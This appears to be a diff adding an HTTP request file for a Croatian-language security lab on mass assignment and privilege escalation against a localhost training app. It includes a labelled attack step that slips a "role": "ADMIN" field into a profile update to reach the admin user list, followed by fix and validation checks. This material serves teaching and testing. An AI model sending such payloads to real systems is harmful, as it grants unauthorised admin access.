@@ -1,0 +1,42 @@
+### =====================================================================
+### Lab02 – A01: Mass assignment / eskalacija privilegija (CWE-915, CWE-269)
+### Upute: docs/labs/lab02-mass-assignment.md
+### =====================================================================
+@host = http://localhost:5080
+@token = ZALIJEPITE_TOKEN_OVDJE
+
+### 1) Prijava kao marko (kopirajte "token" u @token)
+POST {{host}}/api/auth/login
+Content-Type: application/json
+
+{"username": "marko", "password": "Marko123!"}
+
+### 2) Markov profil – uloga USER
+GET {{host}}/api/lab02/profile
+Authorization: Bearer {{token}}
+
+### 3) Marko još nema pristup administraciji – očekivano 403
+GET {{host}}/api/lab02/admin/users
+Authorization: Bearer {{token}}
+
+### 4) NAPAD: uz legitimna polja marko dodaje i "role": "ADMIN"
+PUT {{host}}/api/lab02/profile
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"displayName": "Marko", "email": "m@x.hr", "role": "ADMIN"}
+
+### 5) NAPAD (nastavak): sada dobiva popis svih korisnika (ranjivo: 200)
+GET {{host}}/api/lab02/admin/users
+Authorization: Bearer {{token}}
+
+### 6) PROVJERA POPRAVKA: nakon koraka 4) profil i dalje ima "role": "USER", a korak 5) vraća 403
+GET {{host}}/api/lab02/profile
+Authorization: Bearer {{token}}
+
+### 7) PROVJERA VALIDACIJE (nakon popravka): neispravna e-pošta → 400
+PUT {{host}}/api/lab02/profile
+Authorization: Bearer {{token}}
+Content-Type: application/json
+
+{"displayName": "Marko", "email": "ovo-nije-email"}
